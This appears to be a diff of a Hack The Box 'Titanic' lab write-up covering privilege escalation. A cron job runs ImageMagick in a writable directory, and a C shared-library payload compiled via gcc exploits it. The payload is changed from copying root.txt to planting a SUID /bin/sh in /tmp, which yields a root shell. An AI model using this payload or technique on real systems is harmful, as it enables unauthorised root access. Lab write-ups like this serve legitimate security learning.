@@ -114,14 +114,50 @@ developer@10.10.11.55's password:
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
 
 developer@titanic:~$ cat user.txt
+<flag>
 ```
 
+# Privilege Escalation
+Initially, I tested for sudo by doing `sudo -l` and noticed that we do not have sudo privilege. Instead, I check for all writable directories and 2 perculiar directories came up:
+```sh
+$ find / -type d -writable 2>/dev/null
+...
+/opt/app/static/assets/images
+/opt/app/tickets
+...
+```
+Digging around `/opt/` a bit, I found an interesting script file `/opt/scripts/identify_images.sh`:
 ```sh
 cd /opt/app/static/assets/images
 truncate -s 0 metadata.log
 find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
 ```
+From the code, the script seems to be making modifications to `metadata.log`. This part requires a bit of attention to notice that the script is being executed every minute, which can be confirmed by doing:
+```sh
+developer@titanic:~$ ls -la /opt/app/static/assets/images/
+total 1288
+drwxrwx--- 2 root developer   4096 Feb  3 17:13 .
+drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
+-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
+-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
+-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
+-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
+-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
+-rw-r----- 1 root developer    442 Jun 25 22:52 metadata.log
+developer@titanic:~$ ls -la /opt/app/static/assets/images/
+total 1288
+drwxrwx--- 2 root developer   4096 Feb  3 17:13 .
+drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
+-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
+-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
+-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
+-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
+-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
+-rw-r----- 1 root developer    442 Jun 25 22:54 metadata.log
+```
+Checking the version of `magick` and Googling reveals a [vulnerability](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) that allows us to perform arbitrary code execution.
 
+Since the script is running ImageMagick in `/opt/app/static/assets/images/`, we will `cd` into that and use the payload to exploit the vulnerability. Here, I will just include HTB's official solution since I believe it is objectively better than what I originally did - which was to just copy the `root.txt` file.
 ```sh
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <stdio.h>
@@ -129,11 +165,21 @@ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <unistd.h>
 
 __attribute__((constructor)) void init(){
-	system("cp /root/root.txt root.txt; chmod 777 root.txt");
+	system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
     exit(0);
 }
 EOF
 ```
+The intended solution copies the `sh` shell into `/tmp` and granting it [SUID](https://www.redhat.com/en/blog/suid-sgid-sticky-bit) permissions, allowing the user to execute with the `-p` flag and gaining root privilege. From here, the root flag can be easily obtained.
+```
+developer@titanic:/$ /tmp/sh -p
+# cat /root/root.txt
+<flag>
+```
 
 # Learned Skills
+- Local File Inclusion (LFI) exploitation through requests interception using Burp Suite.
+- VHost fuzzing using Gobuster (from official write-up).
+- Password hash cracking & format preparation for Hashcat.
 - Practical CVE research and hands-on exploitation of ImageMagick vulnerability on actual Linux web server.
+- Many flexible utility Linux commands for small tasks automation.
